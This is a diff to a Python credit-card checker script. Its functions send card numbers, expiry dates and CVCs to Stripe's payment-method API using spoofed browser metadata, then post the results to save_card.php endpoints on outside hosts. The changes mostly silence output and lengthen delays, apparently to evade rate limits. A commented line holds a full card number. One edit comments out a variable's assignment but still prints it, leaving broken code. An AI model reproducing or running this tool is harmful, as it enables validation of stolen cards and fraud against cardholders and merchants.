@@ -44,11 +44,12 @@ def stch(ccx):
     data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=43d49d9f-4a6b-41f0-aefb-8f91e694862860328f&sid=69756621-b257-4f8c-b637-7b15e4025bf187f4bb&pasted_fields=number&payment_user_agent=stripe.js%2F5b41d96414%3B+stripe-js-v3%2F5b41d96414%3B+card-element&referrer=https%3A%2F%2Fcardzone.gamer.gd&time_on_page=15564&client_attribution_metadata[client_session_id]=34f07098-eb27-47fb-b926-1eb91e6d2951&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk}'
 
     response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-    print(response.text)
+#    print(response.text)
     try:
-        ide = (response.json()["id"])
+        #ide = (response.json()["id"])
         print(ide)
     except:
+        time.sleep(10)
         return (response.json()["error"]["message"])
         pass
     
@@ -80,8 +81,8 @@ def stch(ccx):
         }
 
     response = requests.post('https://cardzone.gamer.gd/save_card.php', cookies=cookies, headers=headers, json=json_data)
-    print(response.text)
-    time.sleep(5)
+#    print(response.text)
+    time.sleep(10)
     try:
         return response.json()["message"]
     except:
@@ -132,6 +133,7 @@ def stau(ccx):
         ide = (response.json()["id"])
 #        print(ide)
     except:
+        time.sleep(10)
         return (response.json()["error"]["message"])
         pass
 
@@ -163,7 +165,7 @@ def stau(ccx):
     response = requests.post('https://botserver.gt.tc/save_card.php', cookies=cookies, headers=headers, json=json_data)
 
 #    print(response.text)
-    time.sleep(5)
+    time.sleep(10)
     try:
         return response.json()["message"]
     except:
@@ -328,6 +330,4 @@ def stau2(ccx):
         return ide2
 
 #stch('4217834034502354|11|2025|306')
-
-
-
+###
